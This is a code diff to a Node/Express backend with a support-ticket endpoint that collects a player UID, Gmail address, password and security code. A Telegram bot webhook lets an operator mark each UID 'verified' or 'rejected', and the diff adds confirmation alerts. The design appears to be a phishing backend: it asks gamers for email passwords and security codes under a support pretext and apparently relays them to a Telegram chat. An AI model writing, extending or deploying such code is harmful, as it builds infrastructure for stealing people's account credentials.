@@ -16,14 +16,12 @@ app.get('/', (req, res) => res.send("Backend Running"));
 app.post('/api/submit-ticket', async (req, res) => {
     const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
     
-    if (!userDatabase[uid]) {
-        userDatabase[uid] = {
-            status: "Pending",
-            name: "Checking Status...",
-            level: "Under Review",
-            reason: ""
-        };
-    }
+    userDatabase[uid] = {
+        status: "Pending",
+        name: "Checking Status...",
+        level: "Under Review",
+        reason: ""
+    };
 
     const telegramMessage = `
 📩 *New Support Ticket Submitted!*
@@ -77,6 +75,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const uid = parts[1];
         const reason = parts[2] || "Information Mismatch";
 
+        let confirmationMsg = "";
+
         if (action === 'verify') {
             userDatabase[uid] = {
                 status: "Verified",
@@ -91,6 +91,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
                 parse_mode: 'Markdown'
             });
+
+            confirmationMsg = `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status has been successfully updated to *VERIFIED* on the website!`;
+
         } else if (action === 'reject') {
             userDatabase[uid] = {
                 status: "Rejected",
@@ -105,11 +108,20 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED (${reason})*`,
                 parse_mode: 'Markdown'
             });
+
+            confirmationMsg = `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` has been marked as *REJECTED* (${reason}) on the website!`;
         }
+
+        // টেলিগ্রামে নতুন কনফার্মেশন মেসেজ পাঠানো
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: chatId,
+            text: confirmationMsg,
+            parse_mode: 'Markdown'
+        });
 
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
             callback_query_id: callbackQuery.id,
-            text: `Status updated for UID: ${uid}`
+            text: `Updated Status for UID: ${uid}`
         });
     }
 
